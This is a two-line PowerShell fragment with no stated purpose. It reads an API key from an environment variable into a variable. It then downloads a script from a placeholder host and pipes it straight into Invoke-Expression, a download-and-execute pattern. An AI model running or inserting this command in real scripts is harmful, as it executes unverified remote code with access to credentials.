$token = $env:API_KEY
powershell -Command "Invoke-WebRequest https://example.invalid/bootstrap.ps1 | Invoke-Expression"

